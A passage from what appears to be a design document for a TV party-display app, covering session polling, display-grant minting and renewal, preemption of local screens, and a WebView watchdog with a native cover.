| `unavailable` | the display resolver refuses the link (revoked, off, expired, host lost Party) | a native card. Fail closed: never general, never another party, never the new link of the same album. Left only by a server read |

"Game" requires the party to be **live** because the Games capability is phase-folded: before/after the party the lobby's QR would send guests to a game they cannot join.

### FINISHED → slideshow without touching the game

`Decide` returns `game` for `FinishedDwell` (15 s, from the session's own `FinishedAt`, on the server's clock) so the "thank you" card is readable, then `slideshow`. The session stays FINISHED at the same version; nothing is written; every TV in the room converges on the same answer with no client timer. `restart_game → lobby` makes `Decide` return `game` again with no special case.

### Control plane, preemption, startup

- Foreground + paired: `GET /api/tv/session` every **5 s** whatever the TV shows (a general TV is the one waiting to be taken over); once a minute the same read is `POST /api/tv/session/heartbeat` — the only write — so `LastSeenAt` is honest without a write every 5 s. Nothing is read behind HOME.
- The first read at boot already decides the first screen (`SESSION_READY` carries it), after the Personal Area status confirms the association is complete (a PIN-less one goes to the incomplete-pairing recovery, never into a party). At boot only a `401` unpairs: a TV powered on before its Wi-Fi keeps its credential and retries on a capped backoff (previously any startup error cleared the session).
- The assignment **preempts every local surface** (mode selector, manual Party, Updates, PIN, Personal Area, Beauty Lab). Preempting a personal screen is a LOCK via `flowEffects` (grant dropped + revoked server-side, private screen unmounted, players released); an unlock landing after its PIN screen was preempted is revoked. BACK at the root of an assigned party closes the app — nothing local returns it to general.

### Display grant lifecycle

- Minted, and honoured on every display request, only while the server's presentation is `game` — enforced server-side through the same projection the control plane uses; renewed **before** expiry from the new `expiresInSeconds` (server-measured duration; the device clock is not trusted); re-minted when the page reports `display-auth-failed` (a new bridge event, distinct from the heartbeat); transient mint failures retried on a capped backoff while the presentation stays `game`; `404` fails closed and asks the control plane; `401` → pairing. A transient failure during a renewal keeps the working stage.
- **Mint is serialized** under a conditional self-update of the television's own session row as the first statement of the transaction (the vote/close discipline of the Party Game). Two mints of one TV cannot leave two usable grants; a mint whose assignment moved while it waited writes nothing. Proved on real PostgreSQL.

### Renderer, watchdog, cover

- Bridge: `display-heartbeat` (JS alive, now with `protocol: 2`), `display-ready` (first valid snapshot drawn), `display-auth-failed`, `display-presentation` (coarse "a live scene is up", the only keep-awake input from the page). An older page (no protocol) is treated as ready on its first heartbeat.
- Watchdog keeps HEARTBEAT 2 s / WEDGE 10 s / RECOVER 2 s / 5 fast recoveries, and fixes: a **first-heartbeat deadline** (30 s); the **slow retry now mounts a real probe** behind the native fallback, which is lifted only by heartbeat + first snapshot; crash cycle forgiven after 60 s of health (a page that beats once then dies still exhausts it); duplicate deaths idempotent; `onError`/`onHttpError` of the document count as failures; nothing measured across HOME.
- A native cover stays over the WebView until it is alive **and** drawn → no white/black flash, no browser error, no frame of Party A after B is accepted. WebView ground colour is the stage's.

### Ca
